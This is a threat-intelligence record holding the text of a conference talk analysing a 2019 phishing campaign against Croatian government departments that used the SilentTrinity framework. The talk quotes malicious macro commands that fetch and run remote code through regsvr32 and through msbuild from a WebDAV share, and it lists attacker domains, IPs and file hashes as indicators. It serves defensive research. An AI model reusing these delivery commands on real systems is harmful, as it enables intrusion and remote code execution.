{
    "id": "4efe0368-4111-46d0-b0dd-75f9e51b7260",
    "created_at": "2022-10-25T16:48:12.23253Z",
    "updated_at": "2025-03-27T02:05:46.53518Z",
    "deleted_at": null,
    "sha1_hash": "8be80d313986cff87e9c05c011584d5f2b553ed3",
    "title": "IronPython on the dark side: the silent trio from Croatia",
    "authors": "",
    "file_creation_date": "2019-05-29T16:50:51Z",
    "file_modification_date": "2019-05-29T16:50:51Z",
    "file_size": 1995153,
    "plain_text": "# IronPython on the dark side: the silent trio from Croatia\n\n#### Alexey Vishnyakov, Senior specialist / Positive Technologies\n\n\n-----\n\n## црщфьш whoami\n\n#### • A senior specialist at Expert Security Center,\n\n Positive Technologies\n\n • Threats research\n\n • APT groups tracking\n\n • Software development\n\n • Reporting\n\n###### hd #PHD\n\n\n-----\n\n## Agenda\n\n### • Payload delivery\n\n • SilentTrinity framework\n\n • Attack infrastructure\n\n • Takeaways\n\n • IOCs\n\n###### hd #PHD\n\n\n-----\n\n## Agenda\n\n### • Payload delivery\n\n • SilentTrinity framework\n\n • Attack infrastructure\n\n • Takeaways\n\n • IOCs\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • Last printed: 2018-07-25 00:12:30 (UTC)\n\n • Last saved: 2019-04-01 16:28:07 (UTC)\n\n • First VT submission: 2019-04-02 09:58:13 (UTC)\n\n • Country: HR (Croatia)\n\n##### imglink\n\n#### • Codepage: 1252 ANSI Latin 1; Western European (Windows)\n\n • Author: Windows User\n\n • Last modified by: Teken\n\n###### hd #PHD\n\n\n##### imglink\n\n\n-----\n\n## Payload delivery\n\n###### • Comments: cmd.exe /c echo Set objShell = CreateObject(\"Wscript.Shell\"):\n\n objShell.Run \"net use https://postahr.vip\", 0, False: Wscript.Sleep 10000:\n\n objShell.Run \"regsvr32 /u /n /s /i:https://postahr.vip/page/1/update.sct\n\n scrobj.dll\", 0, False: Set objShell = Nothing >\n\n C:\\users\\%username%\\appdata\\local\\microsoft\\silent.vbs\n\n##### WebDAV server Squiblydoo technique\n\n###### hd #PHD\n\n\n###### 0, False: Wscript.Sleep 10000:\n\n##### WebDAV server\n\n\n-----\n\n## Payload delivery\n\n#### • After opening:\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • After allowing macro:\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • VBA macro:\n\n##### VBS drop\n\n Autorun only, no launch\n\n###### hd #PHD\n\n\n##### VBS drop\n\n Autorun only, no launch\n\n\n-----\n\n## Payload delivery\n\n#### • VBA macro:\n\n##### Some kind of builder?\n\n###### hd #PHD\n\n\n##### Some kind of builder?\n\n\n-----\n\n## Payload delivery\n\n#### • issuu.com :\n\n • stackoverflow.com :\n\n • dummies.com :\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • Downloaded update.sct:\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • Downloaded update.sct:\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • rastamouse.me :\n\n • github.com :\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • Deserialized object – PE .NET\n\n • Sharpick - application to load and run PowerShell code via the .NET assemblies\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • PowerPick GitHub project\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • dnSpy decompilation:\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • Base64 decoded:\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • PowerShell script semi-beautified:\n\n##### RC4 decryption\n\n###### hd #PHD\n\n\n##### RC4 decryption\n\n\n-----\n\n## Payload delivery\n\n#### • fireeye.com :\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • payatu.com :\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • Last printed: 2019-04-02 08:22:56 (UTC)\n\n • Last saved: 2019-04-02 08:23:28 (UTC) (~ +16 hours)\n\n • First VT submission: 2019-04-02 16:52:56 (UTC) (~ +7 hours)\n\n • Country: HR (Croatia)\n\n • Last modified by: Luzer\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n###### • Comments: cmd.exe /c echo Set objShell =\n\n CreateObject(\"Wscript.Shell\"):objShell.Run \"C:\\windows\\system32\\cmd.exe\n\n /c net use \\\\176.105.255.59\\webdav\",0:Wscript.Sleep 60000: objShell.Run\n\n \"%windir%\\Microsoft.Net\\Framework\\v4.0.30319\\msbuild.exe\n\n \\\\176.105.255.59\\webdav\\msbuild.xml\", 0, False: Set objShell = Nothing >\n\n C:\\users\\%username%\\appdata\\local\\microsoft\\silent.vbs\n\n##### MSBuild inline technique\n\n SMB server\n\n###### hd #PHD\n\n\n##### SMB server\n\n\n-----\n\n## Payload delivery\n\n#### • Previous vs current macro:\n\n##### Launch added\n\n###### hd #PHD\n\n\n##### Launch added\n\n\n-----\n\n## Payload delivery\n\n#### • Downloaded msbuild.xml:\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • Downloaded msbuild.xml:\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • Is an example publicly available?\n\n##### imglink\n\n###### hd #PHD\n\n\n##### imglink\n\n\n-----\n\n## Payload delivery\n\n#### • Deserialized object – PE .NET\n\n • SILENTTRINITY?\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • A few old documents\n\n • First VT submission: 2018-08-23 13:20:23 (UTC)\n\n • Country: HR (Croatia)\n\n • Last modified by: Stringer\n\n • First VT submission: 2018-08-29 09:04:26 (UTC)\n\n • Country: ?\n\n • Last modified by: Stringer\n\n###### hd #PHD\n\n\n-----\n\n## Payload delivery\n\n#### • Two macro of old documents:\n\n##### Download via certutil Launch via WMI\n\n###### hd #PHD\n\n\n##### Launch via WMI\n\n\n-----\n\n## Payload delivery\n\n#### • New vs old macro:\n\n##### Comments from the guidelines\n\n###### hd #PHD\n\n\n-----\n\n## Agenda\n\n### • Payload delivery\n\n • SilentTrinity framework\n\n • Attack infrastructure\n\n • Takeaways\n\n • IOCs\n\n###### hd #PHD\n\n\n-----\n\n## SilentTrinity framework\n\n#### • https://www.instagram.com/silenttrinity\n\n## Sophisticated and\n\n mysterious hacker!\n\n No doubt!\n\n##### imglink\n\n###### hd #PHD\n\n\n## Sophisticated and\n\n mysterious hacker!\n\n No doubt!\n\n##### imglink\n\n\n## Sophisticated and\n\n mysterious hacker!\n\n No doubt!\n\n##### imglink\n\n\n-----\n\n## SilentTrinity framework\n\n#### • Created: 2018-10-06\n\n • Author: Marcello Salvati\n\n###### • https://github.com/byt3bl33d3r/SILENTTRINITY\n\n • https://www.convergeconference.org/speakers/marcello-salvati/\n\n • https://www.blackhillsinfosec.com/team/marcello-salvati/\n\n • https://www.irongeek.com/i.php?page=videos/derbycon8/track\n 2-05-ironpython-omfg-marcello-salvati\n\n • https://twitter.com/byt3bl33d3r\n\n##### imglink\n\n###### hd #PHD\n\n\n##### imglink\n\n\n-----\n\n## SilentTrinity framework\n\n##### imglink\n\n###### hd #PHD\n\n\n-----\n\n## SilentTrinity framework\n\n#### • The most interesting features\n\n • IronPython/Boo languages supported\n\n • All in memory\n\n • Diffie–Hellman key exchange\n\n • ZIP and jobs are AES encrypted\n\n • Compatible with proxy\n\n • HTTP/HTTPS\n\n###### hd #PHD\n\n\n-----\n\n## SilentTrinity framework\n\n##### imglink\n\n###### hd #PHD\n\n\n##### imglink\n\n\n-----\n\n## SilentTrinity framework\n\n###### hd #PHD\n\n\n-----\n\n## Agenda\n\n### • Payload delivery\n\n • SilentTrinity framework\n\n • Attack infrastructure\n\n • Takeaways\n\n • IOCs\n\n###### hd #PHD\n\n\n-----\n\n## Attack infrastructure\n\n#### • Domains under WhoisGuard, Inc. (Panama) privacy protection\n\n##### Domain Registered On Mimics to Industry\n\n konzum.win 2018-05-25 konzum.hr Retail\n\n postahr.online 2018-08-22 posta.hr Postal services\n\n posteitaliane.live 2019-01-16 posteitaliane.it Postal services\n\n postahr.vip 2019-02-06 posta.hr Postal services\n\n###### hd #PHD\n\n|Domain|Registered On|Mimics to|Industry|\n|---|---|---|---|\n|konzum.win|2018-05-25|konzum.hr|Retail|\n|postahr.online|2018-08-22|posta.hr|Postal services|\n|posteitaliane.live|2019-01-16|posteitaliane.it|Postal services|\n|postahr.vip|2019-02-06|posta.hr|Postal services|\n\n\n##### Mimics to Industry\n\n konzum.hr Retail\n\n posta.hr Postal services\n\n posteitaliane.it Postal services\n\n posta.hr Postal services\n\n\n-----\n\n## Attack infrastructure\n\n#### • IPs related to Breezle LLC hosting provider (Amsterdam, Netherlands)\n\n • 176.105.254.52\n\n • 176.105.255.59\n\n • 93.170.105.32\n\n###### hd #PHD\n\n\n-----\n\n## Attack infrastructure\n\n##### Breezle LLC\n\n WhoisGuard Inc.\n\n###### hd #PHD\n\n\n##### Breezle LLC\n\n\n-----\n\n## Agenda\n\n### • Payload delivery\n\n • SilentTrinity framework\n\n • Attack infrastructure\n\n • Takeaways\n\n • IOCs\n\n###### hd #PHD\n\n\n-----\n\n## Takeaways\n\n#### • News of an attack: 2019-04-03\n\n##### imglink\n\n###### hd #PHD\n\n\n##### imglink\n\n\n-----\n\n## Takeaways\n\n#### • Victims: Croatian government departments\n\n##### imglink\n\n###### hd #PHD\n\n\n##### imglink\n\n\n-----\n\n## Takeaways\n\n#### • How to defend?\n\n • Application control over trusted software (certutil, regsvr32, msbuild, net, wmic …)\n\n • Inspection of links in the mail\n\n • Periodic memory scans\n\n###### hd #PHD\n\n\n-----\n\n## Takeaways\n\n#### • Completely open-source but powerful and effective kill chain\n\n • The first SilentTrinity framework abuse we know\n\n • Metasploit, Empire, Koadic … pros for red teams and cons for defenders\n\n###### hd #PHD\n\n\n-----\n\n## Agenda\n\n### • Payload delivery\n\n • SilentTrinity framework\n\n • Attack infrastructure\n\n • Takeaways\n\n • IOCs\n\n###### hd #PHD\n\n\n-----\n\n## IOCs\n\n#### • 13db33c83ee680e0a3b454228462e73f\n\n • hxxps://postahr.vip/page/1/update.sct\n\n • 0adb7204ce6bde667c5abd31e4dea164\n\n • 831b08d0c650c8ae9ab8b4a10a199192\n\n • hxxps://posteitaliane.live/owa/mail/archive.srf\n\n • [\\\\]176.105.255.59\\webdav\\msbuild.xml\n\n • hxxps://176.105.255.59:8089\n\n • 79e72899af1e50c18189340e4a1e46e0\n\n • 92530d1b546ddf2f0966bbe10771521f\n\n###### hd #PHD\n\n\n-----\n\n## IOCs\n\n#### • 78184cd55d192cdf6272527c62d2ff89\n\n • hxxp://198.46.182.158/bat3.txt\n\n • c84b7c871bfcd346b3246364140cd60f\n\n • hxxps://konzum.win/bat3.txt\n\n • 92530d1b546ddf2f0966bbe10771521f\n\n • 176.105.254.52\n\n • postahr.online\n\n • 93.170.105.32\n\n • geomeny.bid\n\n###### hd #PHD\n\n\n-----\n\n# Thank you!\n\n##### Alexey Vishnyakov avishnyakov@ptsecurity.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://static.ptsecurity.com/phdays/presentations/phdays-9-ironpython-on-the-dark-side-the-silent-trio-from-croatia.pdf"
    ],
    "report_names": [
        "phdays-9-ironpython-on-the-dark-side-the-silent-trio-from-croatia.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1559148651,
    "ts_modification_date": 1559148651,
    "files": {
        "pdf": "https://archive.orkl.eu/8be80d313986cff87e9c05c011584d5f2b553ed3.pdf",
        "text": "https://archive.orkl.eu/8be80d313986cff87e9c05c011584d5f2b553ed3.txt",
        "img": "https://archive.orkl.eu/8be80d313986cff87e9c05c011584d5f2b553ed3.jpg"
    }
}